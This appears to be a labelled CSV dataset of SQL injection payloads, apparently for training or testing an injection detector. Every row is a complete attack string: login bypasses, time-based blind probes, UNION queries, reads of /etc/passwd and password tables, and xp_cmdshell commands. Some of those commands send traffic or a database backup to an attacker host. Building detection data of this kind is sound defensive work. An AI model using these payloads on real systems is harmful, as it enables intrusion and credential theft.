" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",1
"<>""'%;)(&+",1
|,1
!,1
?,1
/,1
//,1
//*,1
,1
 --,1
(,1
),1
*|,1
*/*,1
&,1
0 or 1=1,1
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1
0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,1
0x77616974666F722064656C61792027303A303A31302700 exec(@s),1
"1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;",1
1 or 1=1,1
1;SELECT%20*,1
1 waitfor delay '0:0:10'--,1
%20or%20''=',1
%20or%201=1,1
)%20or%20('x'='x,1
%20or%20'x'='x,1
%20or%20x=x,1
%20'sleep%2050',1
%20$(sleep%2050),1
23 OR 1=1,1
%27%20or%201=1,1
%2A%28%7C%28mail%3D%2A%29%29,1
%2A%28%7C%28objectclass%3D%2A%29%29,1
%2A%7C,1
||6,1
||'6,1
(||6),1
%7C,1
a',1
admin' or ',1
" and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));",1
 and 1 in (select var from temp)--,1
anything' OR 'x'='x,1
"a"" or 1=1--",1
a' or 1=1--,1
"a"" or 3=3--",1
a' or 3=3--,1
a' or 'a' = 'a,1
&apos;%20OR,1
as,1
asc,1
a' waitfor delay '0:0:10'--,1
; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >,1
bfilename,1
char%4039%41%2b%40SELECT,1
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
declare @q nvarchar (4000) select @q =,1
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),1
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),1
declare @s varchar(22) select @s =,1
declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e,1
delete,1
desc,1
distinct,1
"||(elt(-3+5,bin(15),ord(10),hex(char(45))))",1
; exec master..xp_cmdshell,1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
exec(@s),1
; exec ('sel' + 'ect us' + 'er'),1
exec sp,1
; execute immediate 'sel' || 'ect us' || 'er',1
exec xp,1
; exec xp_regread,1
 group by userid having 1=1--,1
handler,1
having,1
 having 1=1--,1
"hi or 1=1 --""",1
hi' or 1=1 --,1
"hi"") or (""a""=""a",1
hi or a=a,1
hi' or 'a'='a,1
hi') or ('a'='a,1
hi' or 'x'='x';,1
insert,1
like,1
limit,1
*(|(mail=*)),1
*(|(objectclass=*)),1
or,1
 or ''=',1
"or 0=0 #""",1
 or 0=0 --,1
 or 0=0 #,1
" or 0=0 --
or 0=0 --
or 0=0 #
' or 1 --'
' or 1/*
; or '1'='1'
' or '1'='1
' or '1'='1'--
' or 1=1
' or 1=1 /*
' or 1=1--
' or 1=1-- 
'/**/or/**/1/**/=/**/1
 or 1=1 --
 or 1=1--",1
or 1=1,1
or 1=1--,1
"or 1=1 or """"=",1
 or 1=1 or ''=',1
 or 1 in (select @@version)--,1
or%201=1,1
or%201=1 --,1
 or 2 > 1,1
 or 2 between 1 and 3,1
 or 3=3,1
 or 3=3 --,1
 or '7659'='7659,1
or a=a,1
or a = a,1
 or 'a'='a,1
 or a=a--,1
) or ('a'='a,1
" or a""=""a",1
) or (a=a,1
order by,1
 or (EXISTS),1
or isNULL(1/0) /*,1
" or isNULL(1/0) /*
' or 'something' like 'some%'
' or 'something' = 'some'+'thing'
' or 'text' = n'text'
' or 'text' > 't'
' or uid like '%
' or uname like '%
' or 'unusual' = 'unusual'
' or userid like '%
' or user like '%
' or username like '%
' or username like char(37);
' or 'whatever' in ('whatever')
' -- &password=
password:*/=1--
PRINT
PRINT @@variable
procedure
replace
select
' select * from information_schema.tables--
' select name from syscolumns where id = (select id from sysobjects where name = tablename')--
' (select top 1
--sp_password
'sqlattempt1
(sqlattempt2)
'sqlvuln
'+sqlvuln
(sqlvuln)
sqlvuln;
t'exec master..xp_cmdshell 'nslookup www.google.com'--
to_timestamp_tz
truncate
tz_offset
' UNION ALL SELECT
' union all select @@version--
' union select 
uni/**/on sel/**/ect
' UNION SELECT
' union select 1,load_file('/etc/passwd'),1,1,1;
) union select * from information_schema.tables;
' union select * from users where login = char(114,111,111,116);
update
'||UTL_HTTP.REQUEST
,@variable
@variable
@var select @var as var into temp end --
\x27UNION SELECT
x' AND 1=(SELECT COUNT(*) FROM tabname); --
x' AND email IS NULL; --
x' AND members.email IS NULL; --
x' AND userid IS NULL; --
x' or 1=1 or 'x'='y
x' OR full_name LIKE '%Bob%
 or 1=1 --",1
-',1
 ',1
&',1
^',1
*',1
 or ''-',1
 or '' ',1
 or ''&',1
 or ''^',1
 or ''*',1
-,1
 ,1
&,1
^,1
*,1
" or ""-",1
" or "" ",1
" or ""&",1
" or ""^",1
" or ""*",1
or true--,1
" or true--
' or true--
) or true--",1
) or true--,1
 or 'x'='x,1
) or ('x')=('x,1
)) or (('x'))=(('x,1
" or x""=""x",1
") or (x"")=(""x",1
")) or ((x""))=((""x",1
or 1=1,1
or 1=1--,1
or 1=1#,1
or 1=1/*,1
admin' --,1
admin' #,1
admin'/*,1
admin' or '1'='1,1
admin' or '1'='1'--,1
admin' or '1'='1'#,1
admin' or '1'='1'/*,1
admin'or 1=1 or ''=',1
admin' or 1=1,1
admin' or 1=1--,1
admin' or 1=1#,1
admin' or 1=1/*,1
admin') or ('1'='1,1
admin') or ('1'='1'--,1
admin') or ('1'='1'#,1
admin') or ('1'='1'/*,1
admin') or '1'='1,1
admin') or '1'='1'--,1
admin') or '1'='1'#,1
admin') or '1'='1'/*,1
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
"admin"" --",1
"admin"" #",1
"admin""/*",1
"admin"" or ""1""=""1",1
"admin"" or ""1""=""1""--",1
"admin"" or ""1""=""1""#",1
"admin"" or ""1""=""1""/*",1
"admin""or 1=1 or """"=""",1
"admin"" or 1=1",1
"admin"" or 1=1--",1
"admin"" or 1=1#",1
"admin"" or 1=1/*",1
"admin"") or (""1""=""1",1
"admin"") or (""1""=""1""--",1
"admin"") or (""1""=""1""#",1
"admin"") or (""1""=""1""/*",1
"admin"") or ""1""=""1",1
"admin"") or ""1""=""1""--",1
"admin"") or ""1""=""1""#",1
"admin"") or ""1""=""1""/*",1
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
 --,1
 #,1
 ,1
--,1
/*,1
#,1
" --
 #",1
"/*
' and 1='1
' and a='a
 or 1=1
 or true
' or ''='
 or """"=""",1
1) and '1='1,1
" AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055",1
" AND 1=0 UNION ALL SELECT "", 81dc9bdb52d04dc20036dbd8313ed055",1
and 1=1,1
and 1=1,1
 and 'one'='one,1
 and 'one'='one,1
 group by password having 1=1--,1
 group by userid having 1=1--,1
 group by username having 1=1--,1
like '%',1
or 0=0 --,1
or 0=0 #,1
or 0=0 ,1
 or         0=0 #,1
 or 0=0 --,1
 or 0=0 #,1
 or 0=0 ,1
" or 0=0 --
 or 0=0 #",1
" or 0=0 
%' or '0'='0
 or 1=1
 or 1=1--
 or 1=1/*
 or 1=1#
 or 1=1
' or 1=1--
' or '1'='1
' or '1'='1'--
' or '1'='1'/*
' or '1'='1'#
' or '1='1
' or 1=1
' or 1=1 --
' or 1=1 
' or 1=1--
' or 1=1;#
' or 1=1/*
' or 1=1#
' or 1=1
') or '1'='1
') or '1'='1--
') or '1'='1'--
') or '1'='1'/*
') or '1'='1'#
') or ('1'='1
') or ('1'='1--
') or ('1'='1'--
') or ('1'='1'/*
') or ('1'='1'#
'or'1=1
'or'1=1
 or ""1""=""1",1
" or 1""=""1""--",1
" or 1""=""1""/*",1
" or 1""=""1""#",1
" or 1=1
 or 1=1 --",1
" or 1=1 
 or 1=1--",1
" or 1=1/*
 or 1=1#",1
" or 1=1
) or ""1""=""1",1
") or 1""=""1""--",1
") or 1""=""1""/*",1
") or 1""=""1""#",1
") or (1""=""1",1
") or (1""=""1""--",1
") or (1""=""1""/*",1
") or (1""=""1""#",1
) or '1='1,1
) or ('1='1,1
 or 1=1 LIMIT 1;#,1
or 1=1 or ''=',1
"or 1=1 or ""=",1
 or 'a'='a,1
 or a=a--,1
 or a=a,1
) or ('a'='a,1
" or a""=""a",1
") or (a""=""a",1
") or ('a'='a and hi"") or (""a""=""a",1
 or 'one'='one,1
 or 'one'='one,1
 or uid like '%,1
 or uname like '%,1
 or userid like '%,1
 or user like '%,1
 or username like '%,1
 or 'x'='x,1
) or ('x'='x,1
" or x""=""x",1
 OR 'x'='x'#;,1
=' 'or' and '=' 'or',1
" UNION ALL SELECT 1, @@version;#",1
" UNION ALL SELECT system_user(),user();#",1
" UNION select table_schema,table_name FROM information_Schema.tables;#",1
"admin' and substring(password/text(),1,1)='7",1
" and substring(password/text(),1,1)='7",1
 or 1=1 limit 1 -- -+,1
"=""or'",1
"select versionnumber, version_timestamp from sysibm.sysversions;",1
select user from sysibm.sysdummy1;,1
select session_user from sysibm.sysdummy1;,1
select system_user from sysibm.sysdummy1;,1
select current server from sysibm.sysdummy1;,1
select name from sysibm.systables;,1
select grantee from syscat.dbauth;,1
select * from syscat.tabauth;,1
select * from syscat.dbauth where grantee = current user;,1
select * from syscat.tabauth where grantee = current user;,1
"select name, tbname, coltype from sysibm.syscolumns;",1
SELECT schemaname FROM syscat.schemata;,1
select @@version,1
select @@servernamee,1
select @@microsoftversione,1
select * from master..sysserverse,1
select * from sysusers,1
exec master..xp_cmdshell 'ipconfig+/all',1
exec master..xp_cmdshell 'net+view',1
exec master..xp_cmdshell 'net+users',1
exec master..xp_cmdshell 'ping+<attackerip>',1
BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat',1
"create table myfile (line varchar(8000))"" bulk insert foo from 'c:\inetpub\wwwroot\auth.asp'"" select * from myfile""--",1
admin' OR 1=1--,1
OR '' = ',1
admin'--,1
" union select 1, '<user-fieldname>', '<pass-fieldname>' 1--",1
OR 1=1--,1
create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;,1
select version();,1
select current_database();,1
select current_user;,1
select session_user;,1
select current_setting('log_connections');,1
select current_setting('log_statement');,1
select current_setting('port');,1
select current_setting('password_encryption');,1
select current_setting('krb_server_keyfile');,1
select current_setting('virtual_host');,1
select current_setting('port');,1
select current_setting('config_file');,1
select current_setting('hba_file');,1
select current_setting('data_directory');,1
select * from pg_shadow;,1
select * from pg_group;,1
create table myfile (input TEXT);,1
copy myfile from '/etc/passwd';,1
select * from myfile;copy myfile to /tmp/test;,1
)%20waitfor%20delay%20'0:0:20'%20/*,1
)%20waitfor%20delay%20'0:0:20'%20--,1
)%20waitfor%20delay%20'0:0:20'%20/*,1
)%20waitfor%20delay%20'0:0:20'%20--,1
")%20waitfor%20delay%20'0:0:20'%20/*
)%20waitfor%20delay%20'0:0:20'%20--",1
))%20waitfor%20delay%20'0:0:20'%20/*,1
))%20waitfor%20delay%20'0:0:20'%20--,1
))%20waitfor%20delay%20'0:0:20'%20/*,1
))%20waitfor%20delay%20'0:0:20'%20--,1
"))%20waitfor%20delay%20'0:0:20'%20/*
))%20waitfor%20delay%20'0:0:20'%20--",1
",NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL)%20waifor%20delay%20'0:0:20'%20/*",1
",NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL)%20waifor%20delay%20'0:0:20'%20/*",1
"),NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1
waitfor delay '0:0:20' /*,1
waitfor delay '0:0:20' --,1
 waitfor delay '0:0:20' /*,1
 waitfor delay '0:0:20' --,1
" waitfor delay '0:0:20' /* 
 waitfor delay '0:0:20' --",1
) waitfor delay '0:0:20' /*,1
) waitfor delay '0:0:20' --,1
)) waitfor delay '0:0:20' /*,1
)) waitfor delay '0:0:20' --,1
))) waitfor delay '0:0:20' /*,1
))) waitfor delay '0:0:20' --,1
)))) waitfor delay '0:0:20' /*,1
)))) waitfor delay '0:0:20' --,1
))))) waitfor delay '0:0:20' --,1
)))))) waitfor delay '0:0:20' --,1
) waitfor delay '0:0:20' /*,1
) waitfor delay '0:0:20' --,1
") waitfor delay '0:0:20' /* 
) waitfor delay '0:0:20' --",1
)) waitfor delay '0:0:20' /*,1
)) waitfor delay '0:0:20' --,1
")) waitfor delay '0:0:20' /* 
)) waitfor delay '0:0:20' --",1
))) waitfor delay '0:0:20' /*,1
))) waitfor delay '0:0:20' --,1
"))) waitfor delay '0:0:20' /* 
))) waitfor delay '0:0:20' --",1
)))) waitfor delay '0:0:20' /*,1
)))) waitfor delay '0:0:20' --,1
")))) waitfor delay '0:0:20' /* 
)))) waitfor delay '0:0:20' --",1
))))) waitfor delay '0:0:20' /*,1
))))) waitfor delay '0:0:20' --,1
"))))) waitfor delay '0:0:20' /* 
))))) waitfor delay '0:0:20' --",1
)))))) waitfor delay '0:0:20' /*,1
)))))) waitfor delay '0:0:20' --,1
")))))) waitfor delay '0:0:20' /* 
)))))) waitfor delay '0:0:20' --",1